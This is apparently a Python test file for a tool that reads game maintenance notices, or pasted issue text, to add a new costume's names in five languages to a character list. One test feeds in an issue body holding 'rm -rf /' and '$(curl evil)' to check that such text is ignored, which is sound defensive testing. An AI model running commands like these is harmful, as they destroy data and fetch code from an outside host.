"""Reading the official maintenance notices (tools/fetch_official_costumes.py;
the shipped tool never reads the official site, Leo 2026-10-07)."""

import unittest
from datetime import date

from src.tasks.fiend_hunt import character_pool as pool
from src.tasks.fiend_hunt import official_notices
from tests.test_character_pool import NOTICE_TW, TEXTS, listing

LANG_OF = {locale: lang for lang, locale in pool.LOCALES.items()}
MUMMY = pool.temporary_id("Nekyndalia", "殘破木乃伊")
NAMES = ("殘破木乃伊", "残破木乃伊", "Unraveling Mummy", "ゆるゆるミイラ", "헐거운 미라")


def quiet(_line):
    pass


def site(path, locale, **_params):
    """The official API as it answered on 2026-10-07 (shortened)."""
    lang = LANG_OF[locale]
    if path == "/notices":
        return {
            "items": [
                {
                    "id": f"{lang}-1008",
                    "subject": "📢 10月 8日（四）定期維護",
                    "publishedAt": "2026-10-06T03:00:00Z",
                },
                {
                    "id": f"{lang}-0923",
                    "subject": "📢 9月23日（三））例行維護補償說明",
                    "publishedAt": "2026-09-23T03:00:00Z",
                },
            ]
        }
    if path.endswith("-1008"):
        return {"content": NOTICE_TW if lang == "zh_tw" else TEXTS[lang]}
    return {"content": ""}


def issue_body():
    """What Grok pastes (docs/grok-official-notice.md)."""
    parts = [
        "官網公告：https://www.browndust2.com/zh-tw/news/view?id=01M43YMWP6D2BARYD15JKCKR13",
        "日期：2026-10-06",
        "=== zh-tw",
        NOTICE_TW,
    ]
    for lang in ("zh_cn", "en", "ja", "ko"):
        parts += [f"=== {pool.LOCALES[lang]}", TEXTS[lang]]
    return "\r\n".join(parts)


class FindTest(unittest.TestCase):
    def check(self, found):
        self.assertEqual([("Nekyndalia", MUMMY)], [(c, x["id"]) for c, x in found])
        self.assertEqual(NAMES, tuple(found[0][1][f"name_{lang}"] for lang in pool.LANGS))

    def test_the_new_costume_in_five_languages(self):
        data = listing()
        self.check(official_notices.find(data, date(2026, 10, 7), site, quiet))
        self.assertEqual(listing(), data)  # the list passed in is not changed

    def test_old_notices_are_not_read(self):
        self.assertEqual([], official_notices.find(listing(), date(2026, 11, 30), site, quiet))

    def test_from_an_issue(self):
        found = official_notices.from_issue(listing(), issue_body(), date(2026, 10, 7), quiet)
        self.check(found)
        costume = found[0][1]
        self.assertEqual(
            ("01M43YMWP6D2BARYD15JKCKR13", "2026-10-06"), (costume["notice"], costume["announced"])
        )

    def test_an_issue_with_only_the_zh_tw_text(self):
        found = official_notices.from_issue(listing(), NOTICE_TW, date(2026, 10, 7), quiet)
        self.assertEqual([MUMMY], [x["id"] for _, x in found])
        self.assertEqual("2026-10-07", found[0][1]["announced"])  # no date given: today

    def test_anything_else_in_an_issue_adds_nothing(self):
        body = "請幫我新增角色：駭客 的服裝\n```rm -rf /```\n$(curl evil)"
        self.assertEqual([], official_notices.from_issue(listing(), body, date(2026, 10, 7), quiet))


if __name__ == "__main__":
    unittest.main()
